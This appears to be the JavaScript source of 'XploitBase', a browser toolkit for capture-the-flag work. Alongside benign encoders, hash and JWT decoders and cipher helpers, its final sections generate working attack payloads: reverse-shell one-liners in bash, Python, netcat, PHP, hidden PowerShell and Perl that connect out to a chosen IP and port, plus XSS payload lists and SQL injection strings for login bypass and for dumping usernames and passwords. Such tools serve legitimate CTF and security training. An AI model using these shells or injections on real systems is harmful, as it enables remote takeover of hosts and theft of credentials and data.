// XploitBase - Functional CTF Tools

// Theme Toggle
document.addEventListener('DOMContentLoaded', () => {
    const theme = localStorage.getItem('theme') || 'dark';
    if (theme === 'light') document.body.classList.add('light-theme');
    
    document.getElementById('themeToggle')?.addEventListener('click', () => {
        document.body.classList.toggle('light-theme');
        localStorage.setItem('theme', document.body.classList.contains('light-theme') ? 'light' : 'dark');
    });
});

// Toast notification
function toast(msg) {
    document.querySelectorAll('.toast').forEach(t => t.remove());
    const t = document.createElement('div');
    t.className = 'toast';
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => t.remove(), 2000);
}

// Copy to clipboard
function copyText(text) {
    navigator.clipboard.writeText(text).then(() => toast('Copied!'));
}

function copyOutput() {
    const output = document.getElementById('quickOutput').value;
    if (output) copyText(output);
}

// ========== QUICK ENCODE/DECODE ==========

function quickEncode(type) {
    const input = document.getElementById('quickInput').value;
    const output = document.getElementById('quickOutput');
    
    try {
        switch(type) {
            case 'base64':
                output.value = btoa(unescape(encodeURIComponent(input)));
                break;
            case 'url':
                output.value = encodeURIComponent(input);
                break;
            case 'hex':
                output.value = Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
                break;
        }
    } catch(e) {
        output.value = 'Error: ' + e.message;
    }
}

function quickDecode(type) {
    const input = document.getElementById('quickInput').value;
    const output = document.getElementById('quickOutput');
    
    try {
        switch(type) {
            case 'base64':
                output.value = decodeURIComponent(escape(atob(input.trim())));
                break;
            case 'url':
                output.value = decodeURIComponent(input);
                break;
            case 'hex':
                const hex = input.replace(/\s/g, '');
                output.value = hex.match(/.{1,2}/g)?.map(byte => String.fromCharCode(parseInt(byte, 16))).join('') || '';
                break;
        }
    } catch(e) {
        output.value = 'Error: Invalid input';
    }
}

function quickRot13() {
    const input = document.getElementById('quickInput').value;
    document.getElementById('quickOutput').value = input.replace(/[a-zA-Z]/g, c => {
        const base = c <= 'Z' ? 65 : 97;
        return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base);
    });
}

function reverseText() {
    const input = document.getElementById('quickInput').value;
    document.getElementById('quickOutput').value = input.split('').reverse().join('');
}

// ========== HASH IDENTIFIER ==========

function identifyHash() {
    const hash = document.getElementById('hashInput').value.trim();
    const result = document.getElementById('hashResult');
    
    if (!hash) {
        result.innerHTML = '<span style="color:var(--text-muted)">Enter a hash</span>';
        return;
    }
    
    const patterns = [
        { regex: /^[a-f0-9]{32}$/i, types: ['MD5', 'NTLM', 'MD4'] },
        { regex: /^[a-f0-9]{40}$/i, types: ['SHA-1', 'RIPEMD-160'] },
        { regex: /^[a-f0-9]{64}$/i, types: ['SHA-256', 'SHA3-256'] },
        { regex: /^[a-f0-9]{128}$/i, types: ['SHA-512', 'SHA3-512'] },
        { regex: /^\$2[ayb]\$.{56}$/i, types: ['bcrypt'] },
        { regex: /^\$6\$.{16}\$.{86}$/i, types: ['SHA-512 Crypt'] },
        { regex: /^\$5\$.{16}\$.{43}$/i, types: ['SHA-256 Crypt'] },
        { regex: /^\$1\$.{8}\$.{22}$/i, types: ['MD5 Crypt'] },
        { regex: /^[a-f0-9]{16}$/i, types: ['MySQL (old)', 'Half MD5'] },
        { regex: /^\*[a-f0-9]{40}$/i, types: ['MySQL5'] },
    ];
    
    let matches = [];
    for (const p of patterns) {
        if (p.regex.test(hash)) {
            matches = matches.concat(p.types);
        }
    }
    
    if (matches.length > 0) {
        result.innerHTML = `<strong>Possible types:</strong><br>` + matches.map(m => `• ${m}`).join('<br>');
    } else {
        result.innerHTML = `<span style="color:var(--text-muted)">Unknown hash type (${hash.length} chars)</span>`;
    }
}

// ========== JWT DECODER ==========

function decodeJWT() {
    const jwt = document.getElementById('jwtInput').value.trim();
    const result = document.getElementById('jwtResult');
    
    try {
        const parts = jwt.split('.');
        if (parts.length !== 3) throw new Error('Invalid JWT format');
        
        const header = JSON.parse(atob(parts[0]));
        const payload = JSON.parse(atob(parts[1]));
        
        result.innerHTML = `<strong>Header:</strong>\n${JSON.stringify(header, null, 2)}\n\n<strong>Payload:</strong>\n${JSON.stringify(payload, null, 2)}`;
    } catch(e) {
        result.innerHTML = '<span style="color:var(--text-muted)">Invalid JWT token</span>';
    }
}

// ========== NUMBER CONVERTER ==========

function convertNumber() {
    const input = document.getElementById('numInput').value.trim();
    const from = document.getElementById('numFrom').value;
    const result = document.getElementById('numResult');
    
    try {
        let num;
        switch(from) {
            case 'dec': num = parseInt(input, 10); break;
            case 'hex': num = parseInt(input.replace(/^0x/i, ''), 16); break;
            case 'bin': num = parseInt(input.replace(/^0b/i, ''), 2); break;
            case 'oct': num = parseInt(input.replace(/^0o/i, ''), 8); break;
        }
        
        if (isNaN(num)) throw new Error('Invalid number');
        
        result.innerHTML = `
            <div class="result-item" onclick="copyText('${num}')"><span class="label">Dec:</span>${num}</div>
            <div class="result-item" onclick="copyText('0x${num.toString(16).toUpperCase()}')"><span class="label">Hex:</span>0x${num.toString(16).toUpperCase()}</div>
            <div class="result-item" onclick="copyText('0b${num.toString(2)}')"><span class="label">Bin:</span>0b${num.toString(2)}</div>
            <div class="result-item" onclick="copyText('0o${num.toString(8)}')"><span class="label">Oct:</span>0o${num.toString(8)}</div>
        `;
    } catch(e) {
        result.innerHTML = '<span style="color:var(--text-muted)">Invalid number</span>';
    }
}

// ========== TEXT <-> BINARY/HEX ==========

function textToBin() {
    const input = document.getElementById('binHexInput').value;
    const result = Array.from(input).map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
    document.getElementById('binHexResult').innerHTML = `<div class="result-item" onclick="copyText('${result}')">${result}</div>`;
}

function binToText() {
    const input = document.getElementById('binHexInput').value.replace(/\s/g, '');
    try {
        const result = input.match(/.{1,8}/g)?.map(b => String.fromCharCode(parseInt(b, 2))).join('') || '';
        document.getElementById('binHexResult').innerHTML = `<div class="result-item" onclick="copyText('${result}')">${result}</div>`;
    } catch(e) {
        document.getElementById('binHexResult').innerHTML = '<span style="color:var(--text-muted)">Invalid binary</span>';
    }
}

function textToHex() {
    const input = document.getElementById('binHexInput').value;
    const result = Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
    document.getElementById('binHexResult').innerHTML = `<div class="result-item" onclick="copyText('${result}')">${result}</div>`;
}

function hexToText() {
    const input = document.getElementById('binHexInput').value.replace(/\s/g, '');
    try {
        const result = input.match(/.{1,2}/g)?.map(b => String.fromCharCode(parseInt(b, 16))).join('') || '';
        document.getElementById('binHexResult').innerHTML = `<div class="result-item" onclick="copyText('${result}')">${result}</div>`;
    } catch(e) {
        document.getElementById('binHexResult').innerHTML = '<span style="color:var(--text-muted)">Invalid hex</span>';
    }
}

// ========== CAESAR BRUTE FORCE ==========

function caesarBrute() {
    const input = document.getElementById('caesarInput').value;
    const result = document.getElementById('caesarResult');
    
    let html = '';
    for (let shift = 1; shift <= 25; shift++) {
        const decoded = input.replace(/[a-zA-Z]/g, c => {
            const base = c <= 'Z' ? 65 : 97;
            return String.fromCharCode((c.charCodeAt(0) - base + shift) % 26 + base);
        });
        html += `<div class="result-item" onclick="copyText('${decoded.replace(/'/g, "\\'")}')"><span class="label">ROT${shift}:</span>${decoded}</div>`;
    }
    result.innerHTML = html;
}

// ========== XOR CIPHER ==========

function xorEncode() {
    const text = document.getElementById('xorText').value;
    const key = document.getElementById('xorKey').value;
    const result = document.getElementById('xorResult');
    
    if (!key) {
        result.innerHTML = '<span style="color:var(--text-muted)">Enter a key</span>';
        return;
    }
    
    const xored = Array.from(text).map((c, i) => {
        return String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length));
    }).join('');
    
    const hexResult = Array.from(xored).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
    
    result.innerHTML = `
        <div class="result-item" onclick="copyText('${hexResult}')"><span class="label">Hex:</span>${hexResult}</div>
        <div class="result-item"><span class="label">Raw:</span>${xored.replace(/</g, '&lt;')}</div>
    `;
}

// ========== REVERSE SHELL GENERATOR ==========

function genShell(type) {
    const ip = document.getElementById('shellIP').value;
    const port = document.getElementById('shellPort').value;
    const result = document.getElementById('shellResult');
    
    const shells = {
        bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
        python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        nc: `nc -e /bin/sh ${ip} ${port}`,
        php: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
        perl: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
    };
    
    const shell = shells[type] || 'Unknown shell type';
    result.innerHTML = `<div onclick="copyText(\`${shell.replace(/`/g, '\\`')}\`)" style="cursor:pointer">${shell}</div>`;
}

// ========== XSS PAYLOADS ==========

function genXSS() {
    const result = document.getElementById('xssResult');
    const payloads = [
        `<script>alert('XSS')</script>`,
        `<img src=x onerror=alert('XSS')>`,
        `<svg onload=alert('XSS')>`,
        `<body onload=alert('XSS')>`,
        `"><script>alert('XSS')</script>`,
        `'><script>alert('XSS')</script>`,
        `<img src="x" onerror="alert('XSS')">`,
        `<iframe src="javascript:alert('XSS')">`,
        `<a href="javascript:alert('XSS')">click</a>`,
        `<svg/onload=alert('XSS')>`
    ];
    
    result.innerHTML = payloads.map(p => 
        `<div class="result-item" onclick="copyText(\`${p.replace(/`/g, '\\`')}\`)">${p.replace(/</g, '&lt;')}</div>`
    ).join('');
}

// ========== SQLI PAYLOADS ==========

function genSQLi() {
    const type = document.getElementById('sqliType').value;
    const result = document.getElementById('sqliResult');
    
    const payloads = {
        auth: [
            `' OR '1'='1`,
            `' OR '1'='1'--`,
            `' OR '1'='1'/*`,
            `admin'--`,
            `admin' #`,
            `' OR 1=1--`,
            `" OR ""="`,
            `' OR ''='`,
            `1' OR '1'='1`,
            `') OR ('1'='1`
        ],
        union: [
            `' UNION SELECT NULL--`,
            `' UNION SELECT NULL,NULL--`,
            `' UNION SELECT NULL,NULL,NULL--`,
            `' UNION SELECT 1,2,3--`,
            `' UNION SELECT username,password FROM users--`,
            `1' UNION SELECT table_name,NULL FROM information_schema.tables--`,
            `1' UNION SELECT column_name,NULL FROM information_schema.columns--`
        ],
        error: [
            `' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`,
            `' AND extractvalue(1,concat(0x7e,(SELECT version())))--`,
            `' AND updatexml(1,concat(0x7e,(SELECT version())),1)--`,
            `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`
        ]
    };
    
    result.innerHTML = (payloads[type] || []).map(p => 
        `<div class="result-item" onclick="copyText(\`${p.replace(/`/g, '\\`')}\`)">${p}</div>`
    ).join('');
}
